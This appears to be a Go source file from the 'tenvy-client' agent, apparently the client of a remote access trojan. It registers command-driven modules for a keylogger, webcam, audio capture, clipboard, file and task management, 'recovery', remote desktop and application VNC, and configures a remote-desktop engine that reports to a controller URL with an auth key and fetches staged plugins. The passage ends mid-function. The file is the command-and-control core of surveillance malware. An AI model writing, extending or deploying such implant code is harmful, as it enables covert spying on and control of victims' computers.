package agent

import (
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"sync"
	"time"

	appvnc "github.com/rootbay/tenvy-client/internal/modules/control/appvnc"
	audioctrl "github.com/rootbay/tenvy-client/internal/modules/control/audio"
	keyloggerctrl "github.com/rootbay/tenvy-client/internal/modules/control/keylogger"
	remotedesktop "github.com/rootbay/tenvy-client/internal/modules/control/remotedesktop"
	webcamctrl "github.com/rootbay/tenvy-client/internal/modules/control/webcam"
	clipboard "github.com/rootbay/tenvy-client/internal/modules/management/clipboard"
	filemanager "github.com/rootbay/tenvy-client/internal/modules/management/filemanager"
	taskmanager "github.com/rootbay/tenvy-client/internal/modules/management/taskmanager"
	tcpconnections "github.com/rootbay/tenvy-client/internal/modules/management/tcpconnections"
	clientchat "github.com/rootbay/tenvy-client/internal/modules/misc/clientchat"
	notes "github.com/rootbay/tenvy-client/internal/modules/notes"
	recovery "github.com/rootbay/tenvy-client/internal/modules/operations/recovery"
	systeminfo "github.com/rootbay/tenvy-client/internal/modules/systeminfo"
	"github.com/rootbay/tenvy-client/internal/plugins"
	"github.com/rootbay/tenvy-client/internal/protocol"
	manifest "github.com/rootbay/tenvy-client/shared/pluginmanifest"
)

type Config struct {
	AgentID         string
	BaseURL         string
	AuthKey         string
	HTTPClient      *http.Client
	Logger          *log.Logger
	UserAgent       string
	Provider        systeminfo.AgentInfoProvider
	BuildVersion    string
	AgentConfig     protocol.AgentConfig
	Plugins         *plugins.Manager
	ActiveModules   []string
	Extensions      ModuleExtensionRegistry
	PluginManifests map[string]manifest.ManifestDescriptor
	Notes           *notes.Manager
}

func envBool(name string) bool {
	value := strings.TrimSpace(os.Getenv(name))
	switch strings.ToLower(value) {
	case "1", "true", "yes", "on":
		return true
	default:
		return false
	}
}

func envDuration(name string) time.Duration {
	value := strings.TrimSpace(os.Getenv(name))
	if value == "" {
		return 0
	}
	d, err := time.ParseDuration(value)
	if err != nil {
		return 0
	}
	return d
}

func envList(name string) []string {
	raw := os.Getenv(name)
	if strings.TrimSpace(raw) == "" {
		return nil
	}

	parts := strings.FieldsFunc(raw, func(r rune) bool {
		switch r {
		case ',', ';', '\n', '\r', '\t', ' ':
			return true
		default:
			return false
		}
	})

	if len(parts) == 0 {
		return nil
	}

	values := make([]string, 0, len(parts))
	for _, part := range parts {
		trimmed := strings.TrimSpace(part)
		if trimmed != "" {
			values = append(values, trimmed)
		}
	}
	if len(values) == 0 {
		return nil
	}
	return values
}

type ModuleCapability struct {
	ID          string
	Name        string
	Description string
}

type ModuleExtension struct {
	Source       string
	Version      string
	Capabilities []ModuleCapability
}

type ModuleExtensionRegistrar interface {
	RegisterExtension(ModuleExtension) error
}

type ModuleExtensionRegistry interface {
	RegisterModuleExtension(moduleID string, extension ModuleExtension) error
	UnregisterModuleExtension(moduleID, source string) error
}

type ModuleExtensionUnregistrar interface {
	UnregisterExtension(source string) error
}

type ModuleMetadata struct {
	ID           string
	Title        string
	Description  string
	Commands     []string
	Capabilities []ModuleCapability
	Extensions   []ModuleExtension
}

type Module interface {
	ID() string
	Init(context.Context, Config) error
	Handle(context.Context, protocol.Command) error
	UpdateConfig(Config) error
	Shutdown(context.Context) error
}

type moduleMetadataProvider interface {
	Metadata() ModuleMetadata
}

type CommandResultError struct {
	Result protocol.CommandResult
}

func (e *CommandResultError) Error() string {
	if e == nil {
		return ""
	}
	if message := strings.TrimSpace(e.Result.Error); message != "" {
		return message
	}
	if e.Result.Success {
		if output := strings.TrimSpace(e.Result.Output); output != "" {
			return output
		}
		return "command completed"
	}
	return "command failed"
}

func WrapCommandResult(result protocol.CommandResult) error {
	return &CommandResultError{Result: result}
}

type moduleEntry struct {
	module      Module
	metadata    ModuleMetadata
	commands    []string
	base        ModuleMetadata
	registrar   ModuleExtensionRegistrar
	unregistrar ModuleExtensionUnregistrar
	extensions  map[string]ModuleExtension
	enabled     bool
}

func (e *moduleEntry) rebuildMetadata() {
	metadata := copyModuleMetadata(e.base)
	if len(e.extensions) > 0 {
		keys := make([]string, 0, len(e.extensions))
		for source := range e.extensions {
			keys = append(keys, source)
		}
		sort.Strings(keys)
		metadata.Extensions = make([]ModuleExtension, 0, len(keys))
		for _, source := range keys {
			ext := copyModuleExtension(e.extensions[source])
			metadata.Extensions = append(metadata.Extensions, ext)
			if len(ext.Capabilities) > 0 {
				metadata.Capabilities = append(metadata.Capabilities, ext.Capabilities...)
			}
		}
	} else {
		metadata.Extensions = nil
	}
	e.metadata = metadata
}

type appVncInputHandler interface {
	HandleInputBurst(context.Context, protocol.AppVncInputBurst) error
}

type moduleManager struct {
	mu          sync.RWMutex
	modules     map[string]*moduleEntry
	byID        map[string]*moduleEntry
	lifecycle   []*moduleEntry
	remote      *remoteDesktopModule
	remoteEntry *moduleEntry
	appVnc      appVncInputHandler
	appEntry    *moduleEntry
}

func newDefaultModuleManager() *moduleManager {
	registry := newModuleManager()
	registry.register(&appVncModule{})
	registry.register(newRemoteDesktopModule(nil))
	registry.register(newAudioModule())
	registry.register(newKeyloggerModule())
	registry.register(newWebcamModule())
	registry.register(newClipboardModule())
	registry.register(newFileManagerModule())
	registry.register(newTaskManagerModule())
	registry.register(newTCPConnectionsModule())
	registry.register(newClientChatModule())
	registry.register(&recoveryModule{})
	registry.register(newSystemInfoModule())
	registry.register(newNotesModule())
	return registry
}

func newModuleManager() *moduleManager {
	return &moduleManager{
		modules:   make(map[string]*moduleEntry),
		byID:      make(map[string]*moduleEntry),
		lifecycle: make([]*moduleEntry, 0, 6),
	}
}

func (r *moduleManager) register(m Module) {
	provider, ok := any(m).(moduleMetadataProvider)
	if !ok {
		panic("agent module missing metadata provider")
	}
	metadata := provider.Metadata()
	moduleID := strings.TrimSpace(m.ID())
	if moduleID == "" {
		panic("agent module missing identifier")
	}
	if strings.TrimSpace(metadata.ID) == "" {
		panic("agent module missing metadata id")
	}
	if metadata.ID != moduleID {
		panic(fmt.Sprintf("module %s metadata id mismatch: %s", moduleID, metadata.ID))
	}
	commands := metadata.Commands
	if len(commands) == 0 {
		panic(fmt.Sprintf("agent module %s does not declare any commands", metadata.ID))
	}
	entry := &moduleEntry{
		module:     m,
		base:       copyModuleMetadata(metadata),
		commands:   append([]string(nil), commands...),
		extensions: make(map[string]ModuleExtension),
		enabled:    true,
	}
	entry.rebuildMetadata()
	if remote, ok := m.(*remoteDesktopModule); ok {
		r.remote = remote
		r.remoteEntry = entry
	}
	if app, ok := any(m).(appVncInputHandler); ok {
		r.appVnc = app
		r.appEntry = entry
	}
	if registrar, ok := any(m).(ModuleExtensionRegistrar); ok {
		entry.registrar = registrar
	}
	if unregistrar, ok := any(m).(ModuleExtensionUnregistrar); ok {
		entry.unregistrar = unregistrar
	}
	if _, exists := r.byID[moduleID]; exists {
		panic(fmt.Sprintf("module %s already registered", moduleID))
	}
	r.lifecycle = append(r.lifecycle, entry)
	r.byID[moduleID] = entry
	for _, command := range entry.commands {
		if strings.TrimSpace(command) == "" {
			continue
		}
		if existing, ok := r.modules[command]; ok {
			panic(fmt.Sprintf("command %q already registered by module %s", command, existing.metadata.ID))
		}
		r.modules[command] = entry
	}
}

func (r *moduleManager) SetEnabledModules(moduleIDs []string) {
	r.mu.Lock()
	defer r.mu.Unlock()

	if moduleIDs == nil {
		for _, entry := range r.lifecycle {
			entry.enabled = true
		}
		r.rebuildCommandIndexLocked()
		return
	}

	allowed := make(map[string]struct{}, len(moduleIDs))
	for _, id := range moduleIDs {
		trimmed := strings.TrimSpace(id)
		if trimmed == "" {
			continue
		}
		allowed[strings.ToLower(trimmed)] = struct{}{}
	}

	for _, entry := range r.lifecycle {
		_, ok := allowed[strings.ToLower(entry.metadata.ID)]
		entry.enabled = ok
	}

	r.rebuildCommandIndexLocked()
}

func (r *moduleManager) rebuildCommandIndexLocked() {
	r.modules = make(map[string]*moduleEntry, len(r.modules))
	for _, entry := range r.lifecycle {
		if !entry.enabled {
			continue
		}
		for _, command := range entry.commands {
			trimmed := strings.TrimSpace(command)
			if trimmed == "" {
				continue
			}
			r.modules[trimmed] = entry
		}
	}
}

func (r *moduleManager) Init(ctx context.Context, cfg Config) error {
	r.mu.Lock()
	cfg.Extensions = r
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.Unlock()

	var errs []error
	for _, entry := range entries {
		if !entry.enabled {
			continue
		}
		if err := entry.module.Init(ctx, cfg); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) UpdateConfig(cfg Config) error {
	r.mu.Lock()
	cfg.Extensions = r
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.Unlock()

	var errs []error
	for _, entry := range entries {
		if !entry.enabled {
			continue
		}
		if err := entry.module.UpdateConfig(cfg); err != nil {
			label := entry.metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entry.metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) Metadata() []ModuleMetadata {
	r.mu.RLock()
	defer r.mu.RUnlock()

	metadata := make([]ModuleMetadata, 0, len(r.lifecycle))
	for _, entry := range r.lifecycle {
		if !entry.enabled {
			continue
		}
		metadata = append(metadata, copyModuleMetadata(entry.metadata))
	}
	return metadata
}

func (r *moduleManager) RegisterModuleExtension(moduleID string, extension ModuleExtension) error {
	moduleID = strings.TrimSpace(moduleID)
	if moduleID == "" {
		return errors.New("module identifier is required")
	}
	extension.Source = strings.TrimSpace(extension.Source)
	if extension.Source == "" {
		return errors.New("extension source is required")
	}

	sanitized := copyModuleExtension(extension)
	sanitized.Capabilities = sanitizeModuleCapabilities(sanitized.Capabilities)

	r.mu.Lock()
	entry, ok := r.byID[moduleID]
	if !ok {
		r.mu.Unlock()
		return fmt.Errorf("module %s not registered", moduleID)
	}
	entry.extensions[sanitized.Source] = sanitized
	entry.rebuildMetadata()
	registrar := entry.registrar
	r.mu.Unlock()

	if registrar != nil {
		if err := registrar.RegisterExtension(sanitized); err != nil {
			return fmt.Errorf("module %s extension registration failed: %w", moduleID, err)
		}
	}

	return nil
}

func (r *moduleManager) UnregisterModuleExtension(moduleID, source string) error {
	moduleID = strings.TrimSpace(moduleID)
	if moduleID == "" {
		return errors.New("module identifier is required")
	}
	source = strings.TrimSpace(source)
	if source == "" {
		return errors.New("extension source is required")
	}

	r.mu.Lock()
	entry, ok := r.byID[moduleID]
	if !ok {
		r.mu.Unlock()
		return fmt.Errorf("module %s not registered", moduleID)
	}
	unregistrar := entry.unregistrar
	delete(entry.extensions, source)
	entry.rebuildMetadata()
	r.mu.Unlock()

	if unregistrar != nil {
		if err := unregistrar.UnregisterExtension(source); err != nil {
			return fmt.Errorf("module %s extension removal failed: %w", moduleID, err)
		}
	}

	return nil
}

func copyModuleMetadata(metadata ModuleMetadata) ModuleMetadata {
	clone := ModuleMetadata{
		ID:           metadata.ID,
		Title:        metadata.Title,
		Description:  metadata.Description,
		Commands:     append([]string(nil), metadata.Commands...),
		Capabilities: append([]ModuleCapability(nil), metadata.Capabilities...),
	}
	if len(metadata.Extensions) > 0 {
		clone.Extensions = make([]ModuleExtension, 0, len(metadata.Extensions))
		for _, extension := range metadata.Extensions {
			clone.Extensions = append(clone.Extensions, copyModuleExtension(extension))
		}
	}
	return clone
}

func copyModuleExtension(extension ModuleExtension) ModuleExtension {
	return ModuleExtension{
		Source:       extension.Source,
		Version:      extension.Version,
		Capabilities: append([]ModuleCapability(nil), extension.Capabilities...),
	}
}

func sanitizeModuleCapabilities(caps []ModuleCapability) []ModuleCapability {
	if len(caps) == 0 {
		return nil
	}
	sanitized := make([]ModuleCapability, 0, len(caps))
	seen := make(map[string]struct{})
	for _, capability := range caps {
		id := strings.TrimSpace(capability.ID)
		if id == "" {
			id = strings.TrimSpace(capability.Name)
		}
		if id == "" {
			continue
		}
		key := strings.ToLower(id)
		if _, duplicate := seen[key]; duplicate {
			continue
		}
		if descriptor, ok := manifest.LookupCapability(id); ok {
			sanitized = append(sanitized, ModuleCapability{
				ID:          descriptor.ID,
				Name:        descriptor.Name,
				Description: descriptor.Description,
			})
			seen[key] = struct{}{}
			continue
		}
		name := strings.TrimSpace(capability.Name)
		if name == "" {
			name = id
		}
		sanitized = append(sanitized, ModuleCapability{
			ID:          id,
			Name:        name,
			Description: strings.TrimSpace(capability.Description),
		})
		seen[key] = struct{}{}
	}
	if len(sanitized) == 0 {
		return nil
	}
	return sanitized
}

func buildCapabilitySet(base []string, extensions map[string]ModuleExtension) map[string]struct{} {
	size := len(base)
	for _, ext := range extensions {
		size += len(ext.Capabilities)
	}
	capabilities := make(map[string]struct{}, size)
	for _, id := range base {
		trimmed := strings.TrimSpace(id)
		if trimmed == "" {
			continue
		}
		capabilities[strings.ToLower(trimmed)] = struct{}{}
	}
	for _, extension := range extensions {
		for _, capability := range extension.Capabilities {
			id := strings.TrimSpace(capability.ID)
			if id == "" {
				id = strings.TrimSpace(capability.Name)
			}
			if id == "" {
				continue
			}
			capabilities[strings.ToLower(id)] = struct{}{}
		}
	}
	return capabilities
}

type moduleExtensionState struct {
	mu           sync.RWMutex
	base         []string
	extensions   map[string]ModuleExtension
	capabilities map[string]struct{}
}

func newModuleExtensionState(base []string) *moduleExtensionState {
	state := &moduleExtensionState{base: append([]string(nil), base...)}
	state.capabilities = buildCapabilitySet(state.base, nil)
	return state
}

func (s *moduleExtensionState) register(extension ModuleExtension) error {
	if s == nil {
		return errors.New("module extension state not initialized")
	}
	source := strings.TrimSpace(extension.Source)
	if source == "" {
		return errors.New("extension source required")
	}

	sanitized := copyModuleExtension(extension)
	sanitized.Source = source

	s.mu.Lock()
	if s.extensions == nil {
		s.extensions = make(map[string]ModuleExtension)
	}
	s.extensions[source] = sanitized
	s.capabilities = buildCapabilitySet(s.base, s.extensions)
	s.mu.Unlock()
	return nil
}

func (s *moduleExtensionState) unregister(source string) error {
	if s == nil {
		return nil
	}
	trimmed := strings.TrimSpace(source)

	s.mu.Lock()
	if len(s.extensions) == 0 {
		if s.capabilities == nil {
			s.capabilities = buildCapabilitySet(s.base, nil)
		}
		s.mu.Unlock()
		return nil
	}
	if trimmed == "" {
		s.extensions = nil
	} else {
		delete(s.extensions, trimmed)
		if len(s.extensions) == 0 {
			s.extensions = nil
		}
	}
	s.capabilities = buildCapabilitySet(s.base, s.extensions)
	s.mu.Unlock()
	return nil
}

func (s *moduleExtensionState) hasCapability(id string) bool {
	if s == nil {
		return false
	}
	trimmed := strings.TrimSpace(strings.ToLower(id))
	if trimmed == "" {
		return true
	}

	s.mu.RLock()
	capabilities := s.capabilities
	s.mu.RUnlock()
	if capabilities == nil {
		s.mu.Lock()
		if s.capabilities == nil {
			s.capabilities = buildCapabilitySet(s.base, s.extensions)
		}
		capabilities = s.capabilities
		s.mu.Unlock()
	}
	_, ok := capabilities[trimmed]
	return ok
}

func (s *moduleExtensionState) hasAnyCapability(ids ...string) bool {
	for _, id := range ids {
		if s.hasCapability(id) {
			return true
		}
	}
	return false
}

func capabilityUnavailableResult(cmd protocol.Command, moduleID string, capabilities ...string) protocol.CommandResult {
	detail := "required capability"
	if len(capabilities) == 1 {
		detail = capabilities[0]
	} else if len(capabilities) > 1 {
		detail = strings.Join(capabilities, ", ")
	}
	return protocol.CommandResult{
		CommandID:   cmd.ID,
		Success:     false,
		Error:       fmt.Sprintf("%s capability %s requires a registered extension", moduleID, detail),
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
}

func (r *moduleManager) HandleCommand(ctx context.Context, cmd protocol.Command) (bool, protocol.CommandResult) {
	r.mu.RLock()
	entry, ok := r.modules[cmd.Name]
	r.mu.RUnlock()
	if !ok || !entry.enabled {
		return false, protocol.CommandResult{}
	}
	return true, r.wrapCommandResult(cmd, entry.module.Handle(ctx, cmd))
}

func (r *moduleManager) Shutdown(ctx context.Context) error {
	r.mu.RLock()
	entries := append([]*moduleEntry(nil), r.lifecycle...)
	r.mu.RUnlock()

	var errs []error
	for index := len(entries) - 1; index >= 0; index-- {
		if !entries[index].enabled {
			continue
		}
		if err := entries[index].module.Shutdown(ctx); err != nil {
			label := entries[index].metadata.Title
			if strings.TrimSpace(label) == "" {
				label = entries[index].metadata.ID
			}
			errs = append(errs, fmt.Errorf("%s: %w", label, err))
		}
	}

	return errors.Join(errs...)
}

func (r *moduleManager) wrapCommandResult(cmd protocol.Command, err error) protocol.CommandResult {
	completedAt := time.Now().UTC().Format(time.RFC3339Nano)
	if err == nil {
		return protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     true,
			CompletedAt: completedAt,
		}
	}

	var resultErr *CommandResultError
	if errors.As(err, &resultErr) {
		result := resultErr.Result
		if strings.TrimSpace(result.CommandID) == "" {
			result.CommandID = cmd.ID
		}
		if strings.TrimSpace(result.CompletedAt) == "" {
			result.CompletedAt = completedAt
		}
		return result
	}

	return protocol.CommandResult{
		CommandID:   cmd.ID,
		Success:     false,
		Error:       err.Error(),
		CompletedAt: completedAt,
	}
}

func (r *moduleManager) remoteDesktopModule() *remoteDesktopModule {
	r.mu.RLock()
	defer r.mu.RUnlock()
	if r.remoteEntry != nil && !r.remoteEntry.enabled {
		return nil
	}
	return r.remote
}

func (r *moduleManager) appVncModule() appVncInputHandler {
	r.mu.RLock()
	defer r.mu.RUnlock()
	if r.appEntry != nil && !r.appEntry.enabled {
		return nil
	}
	return r.appVnc
}

type appVncModule struct {
	controller *appvnc.Controller
}

func (m *appVncModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "app-vnc",
		Title:       "Application VNC",
		Description: "Launches curated applications inside a disposable workspace and streams them through VNC.",
		Commands:    []string{"app-vnc"},
		Capabilities: []ModuleCapability{
			{
				ID:          "app-vnc.launch",
				Name:        "app-vnc.launch",
				Description: "Clone per-application profiles and start virtualized sessions.",
			},
		},
	}
}

func (m *appVncModule) ID() string {
	return "app-vnc"
}

func (m *appVncModule) ensureController() *appvnc.Controller {
	if m.controller == nil {
		m.controller = appvnc.NewController()
	}
	return m.controller
}

func (m *appVncModule) Init(_ context.Context, cfg Config) error {
	return m.configure(cfg)
}

func (m *appVncModule) configure(cfg Config) error {
	controller := m.ensureController()
	root := filepath.Join(os.TempDir(), "tenvy-appvnc")
	if err := os.MkdirAll(root, 0o755); err != nil {
		return fmt.Errorf("prepare app-vnc workspace root: %w", err)
	}
	controller.Update(appvnc.Config{
		Logger:        cfg.Logger,
		WorkspaceRoot: root,
	})
	return nil
}

func (m *appVncModule) UpdateConfig(cfg Config) error {
	return m.configure(cfg)
}

func (m *appVncModule) Handle(ctx context.Context, cmd protocol.Command) error {
	controller := m.ensureController()
	if controller == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "app-vnc controller unavailable",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	return WrapCommandResult(controller.HandleCommand(ctx, cmd))
}

func (m *appVncModule) HandleInputBurst(ctx context.Context, burst protocol.AppVncInputBurst) error {
	controller := m.ensureController()
	if controller == nil {
		return errors.New("app-vnc controller unavailable")
	}
	return controller.HandleInputBurst(ctx, burst)
}

func (m *appVncModule) Shutdown(ctx context.Context) error {
	if m.controller != nil {
		m.controller.Shutdown(ctx)
	}
	return nil
}

func (a *Agent) moduleRuntime() Config {
	var activeModules []string
	if a.modules != nil {
		metadata := a.modules.Metadata()
		activeModules = make([]string, 0, len(metadata))
		for _, entry := range metadata {
			if id := strings.TrimSpace(entry.ID); id != "" {
				activeModules = append(activeModules, id)
			}
		}
	}

	return Config{
		AgentID:         a.id,
		BaseURL:         a.baseURL,
		AuthKey:         a.key,
		HTTPClient:      a.client,
		Logger:          a.logger,
		UserAgent:       a.userAgent(),
		Provider:        a,
		BuildVersion:    a.buildVersion,
		AgentConfig:     a.config,
		Plugins:         a.plugins,
		ActiveModules:   activeModules,
		Extensions:      a.modules,
		PluginManifests: a.pluginManifestSnapshot(),
		Notes:           a.notes,
	}
}

type remoteDesktopEngineFactory func(context.Context, Config, remotedesktop.Config) (remotedesktop.Engine, string, error)

type remoteDesktopModule struct {
	mu              sync.Mutex
	engine          remotedesktop.Engine
	engineConfig    remotedesktop.Config
	factory         remoteDesktopEngineFactory
	requiredVersion string
	extensions      map[string]ModuleExtension
}

func newRemoteDesktopModule(engine remotedesktop.Engine) *remoteDesktopModule {
	module := &remoteDesktopModule{factory: defaultRemoteDesktopEngineFactory}
	if engine != nil {
		module.engine = engine
	}
	return module
}

func (m *remoteDesktopModule) Metadata() ModuleMetadata {
	return ModuleMetadata{
		ID:          "remote-desktop",
		Title:       "Remote Desktop",
		Description: "Interactive remote desktop streaming and control.",
		Commands:    []string{"remote-desktop"},
		Capabilities: []ModuleCapability{
			{
				ID:          "remote-desktop.stream",
				Name:        "Desktop streaming",
				Description: "Stream high-fidelity desktop frames to the controller UI.",
			},
			{
				ID:          "remote-desktop.input",
				Name:        "Input relay",
				Description: "Relay keyboard and pointer events back to the remote host.",
			},
		},
	}
}

func (m *remoteDesktopModule) ID() string {
	return "remote-desktop"
}

func (m *remoteDesktopModule) Init(ctx context.Context, cfg Config) error {
	return m.configure(ctx, cfg)
}

func (m *remoteDesktopModule) UpdateConfig(cfg Config) error {
	return m.configure(context.Background(), cfg)
}

func (m *remoteDesktopModule) RegisterExtension(extension ModuleExtension) error {
	source := strings.TrimSpace(extension.Source)
	if source == "" {
		return errors.New("extension source required")
	}

	m.mu.Lock()
	defer m.mu.Unlock()

	if m.extensions == nil {
		m.extensions = make(map[string]ModuleExtension)
	}
	m.extensions[source] = copyModuleExtension(extension)
	return nil
}

func (m *remoteDesktopModule) UnregisterExtension(source string) error {
	source = strings.TrimSpace(source)

	m.mu.Lock()
	defer m.mu.Unlock()

	if len(m.extensions) == 0 {
		return nil
	}
	if source == "" {
		m.extensions = nil
		return nil
	}
	delete(m.extensions, source)
	if len(m.extensions) == 0 {
		m.extensions = nil
	}
	return nil
}

func (m *remoteDesktopModule) configure(ctx context.Context, runtime Config) error {
	var requestTimeout time.Duration
	if runtime.HTTPClient != nil {
		requestTimeout = runtime.HTTPClient.Timeout
	}
	cfg := remotedesktop.Config{
		AgentID:        runtime.AgentID,
		BaseURL:        runtime.BaseURL,
		AuthKey:        runtime.AuthKey,
		Client:         runtime.HTTPClient,
		Logger:         runtime.Logger,
		UserAgent:      runtime.UserAgent,
		RequestTimeout: requestTimeout,
	}
	cfg.QUICInput.URL = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_URL")
	cfg.QUICInput.Token = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_TOKEN")
	cfg.QUICInput.ALPN = os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ALPN")
	cfg.QUICInput.Disabled = envBool("TENVY_REMOTE_DESKTOP_QUIC_DISABLED")
	if d := envDuration("TENVY_REMOTE_DESKTOP_QUIC_CONNECT_TIMEOUT"); d > 0 {
		cfg.QUICInput.ConnectTimeout = d
	}
	if d := envDuration("TENVY_REMOTE_DESKTOP_QUIC_RETRY_INTERVAL"); d > 0 {
		cfg.QUICInput.RetryInterval = d
	}
	if v := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_INSECURE")); strings.EqualFold(v, "1") || strings.EqualFold(v, "true") || strings.EqualFold(v, "yes") || strings.EqualFold(v, "on") {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: TENVY_REMOTE_DESKTOP_QUIC_INSECURE is no longer supported; TLS validation remains enabled")
		}
	}
	if path := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_FILE")); path != "" {
		cfg.QUICInput.RootCAFiles = append(cfg.QUICInput.RootCAFiles, path)
	}
	cfg.QUICInput.RootCAFiles = append(cfg.QUICInput.RootCAFiles, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_FILES")...)
	if pem := strings.TrimSpace(os.Getenv("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEM")); pem != "" {
		cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, pem)
	}
	cfg.QUICInput.RootCAPEMs = append(cfg.QUICInput.RootCAPEMs, envList("TENVY_REMOTE_DESKTOP_QUIC_ROOT_CA_PEMS")...)
	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_SPKI_HASHES")...)
	cfg.QUICInput.PinnedSPKIHashes = append(cfg.QUICInput.PinnedSPKIHashes, envList("TENVY_REMOTE_DESKTOP_QUIC_PINNED_SPKI_HASHES")...)
	m.mu.Lock()
	factory := m.factory
	engine := m.engine
	version := strings.TrimSpace(m.requiredVersion)
	m.mu.Unlock()

	if version != "" {
		cfg.PluginVersion = version
	}

	if engine == nil {
		if factory == nil {
			factory = defaultRemoteDesktopEngineFactory
		}
		created, stagedVersion, err := factory(ctx, runtime, cfg)
		if err != nil {
			return err
		}
		stagedVersion = strings.TrimSpace(stagedVersion)
		if stagedVersion != "" {
			cfg.PluginVersion = stagedVersion
		}
		if err := created.Configure(cfg); err != nil {
			return err
		}
		m.mu.Lock()
		m.engine = created
		m.engineConfig = cfg
		if stagedVersion != "" {
			m.requiredVersion = stagedVersion
		}
		m.mu.Unlock()
		return nil
	}

	if err := engine.Configure(cfg); err != nil {
		return err
	}
	m.mu.Lock()
	m.engineConfig = cfg
	m.mu.Unlock()
	return nil
}

func (m *remoteDesktopModule) Handle(ctx context.Context, cmd protocol.Command) error {
	engine := m.currentEngine()
	if engine == nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       "remote desktop subsystem not initialized",
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}
	payload, err := remotedesktop.DecodeCommandPayload(cmd.Payload)
	if err != nil {
		return WrapCommandResult(protocol.CommandResult{
			CommandID:   cmd.ID,
			Success:     false,
			Error:       err.Error(),
			CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
		})
	}

	var actionErr error
	switch strings.ToLower(strings.TrimSpace(payload.Action)) {
	case "start":
		actionErr = engine.StartSession(ctx, payload)
	case "stop":
		actionErr = engine.StopSession(payload.SessionID)
	case "configure":
		actionErr = engine.UpdateSession(payload)
	case "input":
		actionErr = engine.HandleInput(ctx, payload)
	default:
		actionErr = fmt.Errorf("unsupported remote desktop action: %s", payload.Action)
	}

	result := protocol.CommandResult{
		CommandID:   cmd.ID,
		CompletedAt: time.Now().UTC().Format(time.RFC3339Nano),
	}
	if actionErr != nil {
		result.Success = false
		result.Error = actionErr.Error()
	} else {
		result.Success = true
		result.Output = fmt.Sprintf("remote desktop %s action processed", payload.Action)
	}
	return WrapCommandResult(result)
}

func (m *remoteDesktopModule) HandleInputBurst(ctx context.Context, burst protocol.RemoteDesktopInputBurst) error {
	engine := m.currentEngine()
	if engine == nil {
		return errors.New("remote desktop subsystem not initialized")
	}
	if len(burst.Events) == 0 {
		return nil
	}

	events := make([]remotedesktop.RemoteDesktopInputEvent, 0, len(burst.Events))
	for _, evt := range burst.Events {
		event := remotedesktop.RemoteDesktopInputEvent{
			Type:       remotedesktop.RemoteDesktopInputType(evt.Type),
			CapturedAt: evt.CapturedAt,
			X:          evt.X,
			Y:          evt.Y,
			Normalized: evt.Normalized,
			Monitor:    evt.Monitor,
			Button:     remotedesktop.RemoteDesktopMouseButton(evt.Button),
			Pressed:    evt.Pressed,
			DeltaX:     evt.DeltaX,
			DeltaY:     evt.DeltaY,
			DeltaMode:  evt.DeltaMode,
			Key:        evt.Key,
			Code:       evt.Code,
			KeyCode:    evt.KeyCode,
			Repeat:     evt.Repeat,
			AltKey:     evt.AltKey,
			CtrlKey:    evt.CtrlKey,
			ShiftKey:   evt.ShiftKey,
			MetaKey:    evt.MetaKey,
		}
		events = append(events, event)
	}

	payload := remotedesktop.RemoteDesktopCommandPayload{
		Action:    "input",
		SessionID: burst.SessionID,
		Events:    events,
	}

	return engine.HandleInput(ctx, payload)
}

func (m *remoteDesktopModule) Shutdown(context.Context) error {
	engine := m.currentEngine()
	if engine != nil {
		engine.Shutdown()
	}
	return nil
}

func (m *remoteDesktopModule) currentEngine() remotedesktop.Engine {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.engine
}

func defaultRemoteDesktopEngineFactory(ctx context.Context, runtime Config, cfg remotedesktop.Config) (remotedesktop.Engine, string, error) {
	manager := runtime.Plugins
	client := runtime.HTTPClient
	baseURL := strings.TrimSpace(runtime.BaseURL)
	agentID := strings.TrimSpace(runtime.AgentID)

	fallback := func() (remotedesktop.Engine, string, error) {
		engine := remotedesktop.NewRemoteDesktopStreamer(cfg)
		return engine, "", nil
	}

	if manager == nil || client == nil || baseURL == "" || agentID == "" {
		return fallback()
	}

	descriptor, ok := runtime.PluginManifests[plugins.RemoteDesktopEnginePluginID]
	if !ok {
		if runtime.Logger != nil {
			runtime.Logger.Printf("remote desktop: manifest descriptor unavailable")
		}
		return fallback()
	}

	stageCtx := ctx
	if stageCtx == nil {
		stageCtx = context.Background()
	}

	stageCtx, cancel := context.WithTimeout(stageCtx, 30*time.Second)
	defer cancel()

	var metadata protocol.AgentMetadata
	if runtime.Provider != nil {
		metadata = runtime.Provider.AgentMetadata()
	}
	agentVersion := strings.TrimSpace(runtime.BuildVersion)
	if agentVersion == "" {
		agentVersion = strings.TrimSpace(metadata.Version)
	}
	facts := manifest.RuntimeFacts{
		Platform:       metadata.OS,
		Architecture:   metadata.Architecture,
		AgentVersion:   agentVersion,
